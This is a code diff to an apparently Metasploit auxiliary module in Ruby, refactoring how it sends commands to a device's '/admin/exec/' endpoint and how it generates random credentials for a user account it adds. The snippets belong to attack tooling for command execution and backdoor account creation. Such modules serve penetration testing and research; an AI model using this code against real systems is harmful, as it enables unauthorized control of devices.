@@ -96,7 +96,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_command(cmd, cookie)
-    reformatted_cmd = cmd.split(" ").join("+")
+    reformatted_cmd = cmd.gsub(/ /, "+")
 
     res = send_request_cgi(
             'uri'       => "/admin/exec/#{reformatted_cmd}",
@@ -126,8 +126,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def add_user(cookie, tries = 3)
-    username = random_username
-    password = random_password
+    username = Rex::Text.rand_text_alpha_lower(8)
+    password = Rex::Text.rand_text_alphanumeric(20)
 
     tries.times do |i|
       vprint_good("#{peer} - Attemping to add User: #{username}, Pass: #{password}")
@@ -146,18 +146,6 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     return nil
-  end
-
-  # Generates a random password of arbitrary length
-  def random_password(length = 20)
-    char_array = [('a'..'z'), ('A'..'Z'), ('0'..'9')].map { |i| i.to_a }.flatten
-    (0...length).map { char_array[rand(char_array.length)] }.join
-  end
-
-  # Generates a random username of arbitrary length
-  def random_username(length = 8)
-    char_array = [('a'..'z')].map { |i| i.to_a }.flatten
-    (0...length).map { char_array[rand(char_array.length)] }.join
   end
 
   def do_login(user, pass, group)
